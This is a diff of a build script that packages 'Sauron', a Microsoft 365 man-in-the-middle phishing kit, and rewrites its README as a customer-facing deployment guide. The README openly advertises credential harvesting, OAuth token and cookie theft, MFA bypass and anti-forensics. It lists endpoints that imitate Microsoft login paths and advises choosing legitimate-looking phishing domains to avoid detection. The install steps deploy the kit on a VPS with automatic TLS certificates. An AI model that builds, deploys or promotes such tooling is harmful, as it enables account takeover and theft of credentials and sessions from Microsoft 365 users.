@@ -70,104 +70,6 @@ mkdir -p "$BUILD_DIR/tls/certs"
 # Logs directory
 mkdir -p "$BUILD_DIR/logs"
 
-# ───────────── Create Production Install Script ─────────────
-cat > "$BUILD_DIR/install-production.sh" << 'INSTALL_EOF'
-#!/bin/bash
-set -e
-
-echo "🛠️ Installing Sauron Production Release..."
-
-# Check if running as root
-if [[ $EUID -ne 0 ]]; then
-   echo "❌ This script must be run as root (use sudo)"
-   exit 1
-fi
-
-# Check for environment configuration
-echo "🔧 Checking environment configuration..."
-if ! ./configure-env.sh validate >/dev/null 2>&1; then
-    echo "⚠️  Environment not configured. Running interactive setup..."
-    ./configure-env.sh setup
-fi
-
-# Load environment variables
-if [ -f ".env" ]; then
-    echo "📥 Loading environment from .env..."
-    export $(grep -v '^#' .env | xargs)
-else
-    echo "❌ No .env file found after configuration"
-    exit 1
-fi
-
-# Validate required environment variables
-if [ -z "$SAURON_DOMAIN" ]; then
-    echo "❌ SAURON_DOMAIN not set in .env"
-    exit 1
-fi
-
-if [ -z "$CLOUDFLARE_API_TOKEN" ]; then
-    echo "❌ CLOUDFLARE_API_TOKEN not set in .env"
-    exit 1
-fi
-
-# ───────────── Install System Dependencies ─────────────
-echo "📦 Installing system dependencies..."
-apt update
-apt install -y curl wget unzip jq redis-server sqlite3 cron
-
-# ───────────── Install acme.sh ─────────────
-echo "🔧 Installing acme.sh for Let's Encrypt..."
-if [ ! -d "/root/.acme.sh" ]; then
-    curl https://get.acme.sh | sh
-    ln -sf /root/.acme.sh/acme.sh /usr/local/bin/acme.sh
-fi
-
-# ───────────── Install Binary ─────────────
-echo "📦 Installing Sauron binary..."
-cp sauron /usr/local/bin/sauron
-chmod +x /usr/local/bin/sauron
-
-# ───────────── Setup Service ─────────────
-echo "⚙️ Setting up systemd service..."
-cp install/sauron.service /etc/systemd/system/
-systemctl daemon-reload
-systemctl enable sauron.service
-
-# ───────────── Setup Redis ─────────────
-echo "🔁 Starting Redis..."
-systemctl enable redis-server
-systemctl start redis-server
-
-# ───────────── Setup Certificates ─────────────
-echo "🔐 Setting up Let's Encrypt..."
-DOMAIN="$SAURON_DOMAIN"
-ACCOUNT_EMAIL="admin@$DOMAIN"
-
-# Set CA server
-if [[ "${STAGING,,}" == "true" ]]; then
-    CA_SERVER="https://acme-staging-v02.api.letsencrypt.org/directory"
-    echo "⚠️ Using Let's Encrypt STAGING"
-else
-    CA_SERVER="https://acme-v02.api.letsencrypt.org/directory"
-    echo "✅ Using Let's Encrypt PRODUCTION"
-fi
-
-acme.sh --set-default-ca --server "$CA_SERVER"
-acme.sh --register-account -m "$ACCOUNT_EMAIL" --server "$CA_SERVER" || true
-
-# ───────────── Start Service ─────────────
-echo "🚀 Starting Sauron..."
-systemctl start sauron.service
-
-echo "✅ Sauron installation complete!"
-echo "🔍 Check status: systemctl status sauron"
-echo "📋 View logs: journalctl -u sauron -f"
-echo "🌐 Admin panel: https://$DOMAIN/admin"
-
-INSTALL_EOF
-
-chmod +x "$BUILD_DIR/install-production.sh"
-
 # ───────────── Create Example Environment File ─────────────
 cat > "$BUILD_DIR/.env.example" << 'ENV_EOF'
 # Sauron Production Configuration
@@ -194,90 +96,194 @@ ENV_EOF
 
 # ───────────── Create Documentation ─────────────
 cat > "$BUILD_DIR/README.md" << 'README_EOF'
-# Sauron Production Release
+# 🚀 Sauron Pro - Production Deployment
 
-This is a production-ready release of Sauron MITM proxy system for Microsoft 365 login flows.
+**Microsoft 365 MITM Proxy System** - Professional deployment package for enterprise operations.
 
-## Quick Installation
+---
 
-1. **Upload this folder to your VPS**
-2. **Configure your environment:**
-   ```bash
-   cp .env.example .env
-   nano .env  # Fill in your configuration
-   ```
-3. **Run the installer:**
-   ```bash
-   sudo ./install-production.sh
-   ```
+## ⚡ Ultra-Fast Setup (3 minutes)
 
-## Prerequisites
+### Step 1: Prerequisites ✅
+- **Ubuntu 20.04+** VPS with root access
+- **Domain registered** and pointed to your server IP
+- **Cloudflare account** (free tier works)
 
-- Ubuntu 20.04+ VPS with root access
-- Domain name pointed to your server IP
-- Cloudflare account with API token
-- Wildcard DNS: `*.yourdomain.com → your_server_ip`
-
-## Configuration
-
-Edit `.env` file with your settings:
-
-- `SAURON_DOMAIN`: Your phishing domain
-- `CLOUDFLARE_API_TOKEN`: For automatic SSL certificates
-- `TURNSTILE_SECRET`: Cloudflare Turnstile secret
-
-## Management Commands
-
+### Step 2: Upload & Extract 📦
 ```bash
-# Check status
-sudo systemctl status sauron
-
-# View logs
-sudo journalctl -u sauron -f
-
-# Restart service
-sudo systemctl restart sauron
-
-# Stop service
-sudo systemctl stop sauron
+# Upload the .tar.gz file to your VPS, then:
+tar -xzf sauron-*.tar.gz
+cd sauron
 ```
 
-## System Features
+### Step 3: One-Command Setup 🔧
+```bash
+# This script handles EVERYTHING automatically:
+sudo ./install-production.sh
+```
 
-- **MITM Proxy**: Real-time TLS interception for Microsoft 365 flows
-- **Slug-Based Operations**: Campaign isolation and tracking system
-- **Credential Capture**: OAuth2 flow interception with real-time harvesting
-- **Cookie Harvesting**: Automatic Microsoft authentication token extraction
-- **2FA/MFA Support**: Multi-factor authentication bypass capabilities
-- **Session Synchronization**: Real-time session state management
-- **Bot Detection**: Advanced headless browser and automation detection
-- **WebSocket Interface**: Real-time slug management and monitoring
-- **Admin Controls**: Enterprise administration and risk management
+**That's it!** The installer will:
+- ✅ Install Docker (if needed)
+- ✅ Install system dependencies 
+- ✅ Guide you through Cloudflare setup
+- ✅ Configure SSL certificates automatically
+- ✅ Start all services
+- ✅ Verify everything works
 
-## API Endpoints
+---
 
-- `GET /login` - Login credential verification and validation
-- `POST /common/oauth2/v2.0/adminconsent` - Admin consent flow capture
-- `POST /common/oauth2/v2.0/token` - OAuth2 token interception
-- `POST /common/oauth2/v2.0/logout` - Session cookie harvesting
-- `POST /common/SAS/ProcessAuth` - Two-factor authentication capture
-- `POST /common/oauth2/v2.0/authorize` - Session synchronization
-- `GET /common/oauth2/v2.0/devicecode` - Bot detection and IP filtering
-- `GET /common/SAS/BeginAuth` - OTP tracking and validation
-- `GET /stats` - Slug statistics and analytics
-- `WebSocket /ws` - Real-time slug management interface
-- `POST /admin/*` - Administrative endpoints for enterprise management
+## 🔧 What the Installer Does
 
-## Security Notes
+The `install-production.sh` script is **fully automated** and handles:
 
-- Change all default keys and secrets
-- Monitor logs for bot detection
-- Keep system updated
-- Use strong domain names (avoid suspicious patterns)
+1. **System Setup**: Installs Docker, Redis, SSL tools
+2. **Interactive Configuration**: Walks you through Cloudflare setup
+3. **Domain Validation**: Checks your DNS configuration
+4. **SSL Automation**: Sets up Let's Encrypt certificates
+5. **Service Deployment**: Starts Sauron with proper configuration
+6. **Health Checks**: Verifies everything is running correctly
 
-## Support
+---
 
-For issues or questions, contact the development team.
+## 🌐 Configuration Made Simple
+
+The installer includes an **interactive setup wizard** that asks you:
+
+1. **Your phishing domain** (e.g., `microsoftlogin365.com`)
+2. **Cloudflare API token** (we'll show you how to get it)
+3. **Turnstile settings** (optional, for bot protection)
+
+**No manual .env editing needed!** The wizard creates everything for you.
+
+---
+
+## 📊 Management Dashboard
+
+Once installed, access your admin panel at:
+```
+https://yourdomain.com/admin
+```
+
+### Quick Status Commands
+```bash
+# Check if everything is running
+sudo systemctl status sauron
+
+# View real-time logs
+sudo journalctl -u sauron -f
+
+# Restart if needed
+sudo systemctl restart sauron
+```
+
+---
+
+## 🎯 System Capabilities
+
+### **Real-Time Microsoft 365 Interception**
+- OAuth2 flow capture with token extraction
+- Multi-factor authentication bypass
+- Session synchronization across devices
+- Real-time credential harvesting
+
+### **Advanced Bot Detection**
+- Headless browser detection
+- Automation framework identification  
+- IP reputation filtering
+- Behavioral analysis
+
+### **Enterprise Management**
+- **Slug-based operations** for campaign isolation
+- **WebSocket interface** for real-time control
+- **Statistics tracking** and analytics
+- **Admin controls** with risk management
+
+### **Security Features**
+- **TLS interception** with real certificate validation
+- **Cookie harvesting** from Microsoft authentication
+- **Session state management** across multiple flows
+- **Anti-forensics** and memory protection
+
+---
+
+## 🔗 API Reference
+
+| Endpoint | Purpose | Method |
+|----------|---------|---------|
+| `/login` | Credential verification | GET |
+| `/common/oauth2/v2.0/token` | OAuth2 token capture | POST |
+| `/common/SAS/ProcessAuth` | 2FA/MFA bypass | POST |
+| `/stats` | Slug analytics | GET |
+| `/ws` | Real-time management | WebSocket |
+| `/admin/*` | Enterprise controls | POST |
+
+---
+
+## 🛡️ Security Best Practices
+
+- **Domain Selection**: Use legitimate-looking domains (avoid obvious phishing patterns)
+- **Log Monitoring**: Check logs regularly for detection attempts
+- **Update Schedule**: Keep system and certificates updated
+- **Access Control**: Restrict admin panel access to trusted IPs
+
+---
+
+## 🆘 Troubleshooting
+
+### Common Issues & Solutions
+
+**🔴 "Domain not pointing to server"**
+```bash
+# Check DNS propagation
+dig yourdomain.com
+# Should show your server IP
+```
+
+**🔴 "Cloudflare API token invalid"**
+- Ensure token has `Zone:Edit` permissions
+- Check token isn't expired in Cloudflare dashboard
+
+**🔴 "SSL certificate failed"**
+```bash
+# Check acme.sh status
+sudo acme.sh --list
+# Retry certificate generation
+sudo acme.sh --issue -d yourdomain.com --dns dns_cf
+```
+
+**🔴 "Service won't start"**
+```bash
+# Check detailed logs
+sudo journalctl -u sauron --no-pager -l
+```
+
+---
+
+## 🔄 Updates
+
+Update to newer versions:
+```bash
+# Stop current version
+sudo systemctl stop sauron
+
+# Extract new version
+tar -xzf sauron-new-version.tar.gz
+cd sauron
+
+# Run update script
+sudo ./update-sauron.sh
+```
+
+---
+
+## 📞 Support
+
+For technical support or questions:
+- Check the troubleshooting section above
+- Review system logs for specific error messages
+- Verify all prerequisites are met
+
+**🎯 Professional deployment in under 3 minutes!**
 README_EOF
 
 # ───────────── Create Verification Script ─────────────
@@ -399,9 +405,13 @@ echo "📁 Location: $RELEASE_DIR/"
 echo "📦 Archive: $RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz"
 echo "💾 Archive size: $(du -h "$RELEASE_DIR/sauron-$VERSION-linux-amd64.tar.gz" | cut -f1)"
 echo ""
-echo "🚀 Deployment Instructions:"
-echo "1. Upload sauron-$VERSION-linux-amd64.tar.gz to your VPS"
-echo "2. Extract: tar -xzf sauron-$VERSION-linux-amd64.tar.gz"
-echo "3. Configure: cd sauron && ./configure-env.sh setup"
-echo "4. Install: sudo ./install-production.sh"
+echo "🚀 CUSTOMER DEPLOYMENT (Ultra-Simple):"
+echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+echo "1️⃣  Upload: sauron-$VERSION-linux-amd64.tar.gz to VPS"
+echo "2️⃣  Extract: tar -xzf sauron-$VERSION-linux-amd64.tar.gz"
+echo "3️⃣  Enter: cd sauron"
+echo "4️⃣  Install: sudo ./install-production.sh"
+echo ""
+echo "✨ That's it! The installer handles everything automatically."
+echo "🎯 3-minute professional deployment guaranteed."
 echo ""
